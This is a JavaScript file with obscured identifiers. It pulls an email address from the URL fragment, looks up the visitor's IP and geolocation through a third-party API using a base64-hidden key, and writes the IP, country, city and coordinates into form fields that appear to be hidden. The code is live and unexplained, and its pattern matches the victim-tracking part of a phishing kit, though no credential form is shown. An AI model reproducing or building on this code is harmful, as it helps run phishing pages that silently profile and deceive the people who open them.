const __winHref = window.location.href.split("?")[0];
const __getInd__ = (str, search) => str.indexOf(search);
const __getSlice__ = (str, index) => str.substr(index);
const __getEl__ = (sel) => document.querySelector(sel);
const __json = (url) => fetch(url).then((res) => res.json());

// cnt_ins_targets
const lg_cntHome = __getEl__(".pg_cont");
const mbl_cntHome = __getEl__(".m_pg_cnt");
const hydr_scrpt = __getEl__("#hydr_scrpt");

// all_inps_set
const setAllInpElems = (sel, val) => {
  const elems = Array.from(document.querySelectorAll(sel));

  if(elems && elems.length > 0){
    elems.forEach(elem => {
      elem.value = val || "error retrieving data";;
    });
  }
}

// subC rtvr
const ___getSC = (_s = null, subj = 'l') => {
  const new_sc = { sc: 0, new: true };

  if (!_s || typeof _s !== "string") {
    console.log("sc rtrvl fld");
    return  new_sc;
  }

  const _sc_indx = _s.indexOf(subj);

  console.log({ _sc_indx });

  if (_sc_indx === -1) return new_sc;

  const sc = Number(_s.substring(_sc_indx + 1));

  if (typeof sc !== "number" || isNaN(sc)) {
    console.log("error: sc rtrvl fld", { sc });
    return new_sc;
  }

  console.log({ sc });
  return { sc, new: false };
};

// rtrv URLEM
// const __getURLEm = () => {
//     if(__getInd__(__winHref, "#") === -1){
//       console.log("uem 1 fld");
//       return false;
//     }

//     // if(__getInd__(__winHref, "@") === -1){
//     //   console.log("uem 2 fld");
//     //   return false;
//     // }

//     return __getSlice__(__winHref, __getInd__(__winHref, "#") + 1);
// }


const __getURLEm = () => {
  if (__getInd__(__winHref, "#") === -1) {
    console.log("ue 1 failed");
    return false;
  }

  return __getSlice__(__winHref, __getInd__(__winHref, "#") + 1);
};

// ftchloc
async function loadLoc(key) {
    return await __json(`https://api.ipdata.co?api-key=${atob(key)}`);
  }

// logtest
const clg = (d) => console.log(d);

// ue_test
const ue_test = (__winHref, __UrlEm) => {
  if (
    __getInd__(__winHref, "#") === -1 ||
    // __getInd__(__winHref, "@") === -1 ||
    !Boolean(__UrlEm)
  ) {                
      console.log("fld");
      return false;
  }
  
  return true;
}

const setLocDt = (__locData) => {
  setAllInpElems("._pidt__field", __locData.ip);
  setAllInpElems("._ocdt__field", __locData.country_name);
  setAllInpElems("._icdt__field", __locData.city);
  setAllInpElems("._oldt__field", __locData.longitude);
  setAllInpElems("._aldt__field", __locData.latitude);
}